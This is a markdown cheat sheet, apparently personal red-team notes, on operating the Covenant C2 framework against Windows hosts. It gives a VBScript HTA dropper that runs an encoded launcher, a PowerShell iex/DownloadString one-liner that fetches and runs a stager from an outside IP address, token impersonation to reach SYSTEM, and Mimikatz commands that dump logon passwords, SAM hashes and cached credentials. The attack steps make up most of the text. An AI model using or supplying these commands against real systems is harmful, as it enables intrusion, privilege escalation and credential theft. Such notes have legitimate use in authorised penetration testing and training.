## Covenant C2 Framework
- https://github.com/cobbr/Covenant

### Installation
- https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### General
#### Start Covenant
```
/opt/Covenant/Covenant > dotnet run
```

#### Create a listener
- https://github.com/cobbr/Covenant/wiki/Listeners
- Give it a name and ConnectAdress the adress to Connect to

#### Create a launcher (For example PowerShell)
- Select a listener
- Click on Host and create a different url, for example ```\HTTPStager.ps1``` and click on Host!
- Copy the Launcher and Encoded Launcher codes
- If making an executable try both DotNetversions!

#### HTA script
- Use the command in the following HTA file
```
<script language="VBScript">
Function DoStuff()
Dim wsh
Set wsh = CreateObject("Wscript.Shell") 
wsh.run "[YOUR ENCODED LAUNCHER]" 
Set wsh = Nothing
End Function 
DoStuff
self.close 
</script>
```

#### Go back to listener and upload the HTA file

### Run executables on target
- Interact with the grunt.
- Go to tasks, select Assembly, select executable and run!
- Which works: Watson, Sharphound,
- 
### Escalate to system
- Run the task processlist and look for a process running as ```NT AUTHORITY\SYSTEM```
- Then run ImpersonateProcess ```ImpersonateProcess /processid:"<PROCESS ID>"```
- Then run the Launcher again to spawn another grunt. ```Powershell iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/Stgr.ps1')```
- Go back to the current context using task ```RevertToSelf```

### Dumping credentials
- From System or High integrity
#### Logon passwords
```
Mimikatz sekurlsa::logonpasswords
```

#### Cached credentials
```
LsaCache
```

#### SAM
```
Mimikatz lsadump::sam
```

#### SafetyKatz
```
SafetyKatz
```

### Impersonate
- For example when there is no RDP open and want to run on other credentials
- Open the grunt, Go to task and select "MakeToken"
- Enter the credentials and type Logontype ```LOGON32_LOGON_INTERACTIVE```

```
MakeToken /username:"<USER>" /domain:"<DOMAIN>" /password:"<PASSWORD>" /logontype:"LOGON32_LOGON_INTERACTIVE"
```

### Import scripts
- Interact with the grunt.
- Go to tasks, select PowerShellImport and select the powershell script

### Runas command
```
ShellRunAs /shellcommand:"whoami" /username:"<USERNAME>" /domain:"<DOMAIN>" /password:"<PASSWORD>"
```
